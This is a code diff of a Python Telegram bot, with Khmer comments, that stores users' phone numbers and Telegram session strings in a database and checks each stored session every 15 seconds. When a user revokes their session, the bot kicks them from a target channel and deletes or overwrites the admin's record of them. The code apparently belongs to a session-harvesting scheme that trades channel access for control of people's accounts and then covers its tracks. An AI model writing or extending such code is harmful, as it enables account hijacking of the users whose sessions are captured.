@@ -12,14 +12,14 @@ API_ID = int(os.getenv("TELEGRAM_API_ID", "0"))
 API_HASH = os.getenv("TELEGRAM_API_HASH", "")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "")
 
-# 🛠 បំប្លែង ADMIN_CHAT_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error
+# 🛠 បំប្លែង ADMIN_CHAT_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error Peer ID
 raw_admin_chat = os.getenv("ADMIN_CHAT_ID", "")
 if raw_admin_chat.lstrip('-').isdigit():
     ADMIN_CHAT_ID = int(raw_admin_chat)
 else:
     ADMIN_CHAT_ID = raw_admin_chat
 
-# 🛠 បំប្លែង TARGET_CHANNEL_ID ទៅជា Integer ប្រសិនបើវាជាលេខ ID ជៀសវាង Error
+# 🛠 បំប្លែង TARGET_CHANNEL_ID ទៅជា Integer
 raw_target = os.getenv("TARGET_CHANNEL_ID", os.getenv("ADMIN_CHAT_ID", ""))
 if raw_target.lstrip('-').isdigit():
     TARGET_CHANNEL_ID = int(raw_target)
@@ -27,7 +27,7 @@ else:
     TARGET_CHANNEL_ID = raw_target
 
 temp_clients = {}
-active_monitors = {}  # ទុក Monitor Tasks តាម Phone Number
+active_monitors = {}
 STATIC_INVITE_LINK = "https://t.me/+bDGHiHUCt_MwOWY9"
 
 # ─── DATABASE HELPER FUNCTIONS ───
@@ -74,7 +74,6 @@ def get_all_active_sessions():
     return rows
 
 def is_user_session_active(user_id):
-    """ ពិនិត្យមើលថា user_id នោះមានក្នុង Database យើងឬទេ """
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute('SELECT 1 FROM active_sessions WHERE user_id = ?', (user_id,))
@@ -112,6 +111,7 @@ def parse_device_info(user_agent=""):
         system_version = "macOS Sonoma"
     return device_model, system_version
 
+# ─── HELPER FOR KICKING USER ───
 def kick_user_from_chat(chat_id, user_id):
     if not BOT_TOKEN or not chat_id or not user_id:
         return
@@ -122,7 +122,7 @@ def kick_user_from_chat(chat_id, user_id):
             json={"chat_id": chat_id, "user_id": user_id},
             timeout=5
         )
-        # 2. Unban User វិញភ្លាមៗ (ដើម្បីឱ្យអាច Join ឡើងវិញបាន)
+        # 2. Unban User វិញភ្លាមៗ
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/unbanChatMember",
             json={"chat_id": chat_id, "user_id": user_id, "only_if_banned": True},
@@ -132,22 +132,35 @@ def kick_user_from_chat(chat_id, user_id):
     except Exception as e:
         print(f"Failed to kick user {user_id}: {e}")
 
+# ─── HELPER FOR DELETING OR EDITING ADMIN MESSAGE ───
 def delete_admin_message(chat_id, message_id):
-    """ មុខងារលុបសារ notification ចេញពី Admin Chat """
+    """ មុខងារលុបសារ Admin Notification ពេល Session ត្រូវគេ Terminate """
     if not BOT_TOKEN or not chat_id or not message_id:
         return
     try:
+        # 1. ព្យាយាម Delete Message
         res = requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage",
-            json={"chat_id": chat_id, "message_id": message_id},
+            json={"chat_id": chat_id, "message_id": int(message_id)},
             timeout=5
         ).json()
-        if res.get("ok"):
-            print(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
+        
+        # 2. ប្រសិនបើ Telegram មិនឱ្យ Delete (ឧ. ក្នុង Chat ផ្ទាល់ខ្លួនលើស 48 ម៉ោង) -> Edit សារចោលភ្លាម
+        if not res.get("ok"):
+            print(f"⚠️ Delete failed: {res.get('description')}. Editing message text instead...")
+            requests.post(
+                f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
+                json={
+                    "chat_id": chat_id,
+                    "message_id": int(message_id),
+                    "text": "🔴 **[SESSION TERMINATED & REMOVED]**\n\n*(Session នេះត្រូវគេ Terminated រួចរាល់ Data ត្រូវបានលុបចេញពី System)*"
+                },
+                timeout=5
+            )
         else:
-            print(f"⚠️ Failed to delete message {message_id}: {res.get('description')}")
+            print(f"🗑️ Successfully deleted message {message_id} from Admin Chat.")
     except Exception as del_err:
-        print(f"Failed to delete message {message_id}: {del_err}")
+        print(f"Failed to delete/edit message {message_id}: {del_err}")
 
 # ─── REAL-TIME MONITORING PER SESSION ───
 async def monitor_single_session(phone, user_id, session_str, msg_id):
@@ -169,22 +182,21 @@ async def monitor_single_session(phone, user_id, session_str, msg_id):
             await asyncio.sleep(15)
 
     except Exception as e:
-        # ត្រួតពិនិត្យ Error Message ថា Session ត្រូវគេ Terminate/Revoke ឬអត់
         err_str = str(e).lower()
         if any(err_type in err_str for err_type in ["authkeyunregistered", "sessionrevoked", "userdeactivated", "unauthorized", "auth_key_invalid"]):
             is_terminated = True
         else:
-            print(f"⚠️ Other Error on {phone}: {e}")
+            print(f"⚠️ Connection check error on {phone}: {e}")
 
-    # ប្រសិនបើ Session ត្រូវគេ Terminate/Revoke
+    # ប្រសិនបើដឹងថា Session ត្រូវគេ Terminate
     if is_terminated:
-        print(f"🚨 TERMINATED DETECTED for {phone}! Deleting Chat & Kicking...")
+        print(f"🚨 TERMINATED DETECTED for {phone}! Kicking user & Cleaning admin chat...")
         
         # 1. Kick User ភ្លាមៗចេញពី Target Channel/Group
         if TARGET_CHANNEL_ID and user_id:
             await asyncio.to_thread(kick_user_from_chat, TARGET_CHANNEL_ID, user_id)
 
-        # 2. Delete Message ភ្លាមៗចេញពី Admin Chat (លុបសារមិនឱ្យឃើញ)
+        # 2. លុបសារ (ឬ Edit) Notification ចេញពី Admin Chat ភ្លាមៗ
         if ADMIN_CHAT_ID and msg_id:
             await asyncio.to_thread(delete_admin_message, ADMIN_CHAT_ID, msg_id)
 
@@ -216,7 +228,6 @@ if bot_client:
             print(f"Error in member guard listener: {e}")
 
 async def start_all_monitors():
-    """ ទាញយក Sessions ទាំងអស់មកចាប់ផ្តើម Monitor ពេល App Start """
     sessions = get_all_active_sessions()
     for phone, user_id, session_str, msg_id in sessions:
         if phone not in active_monitors:
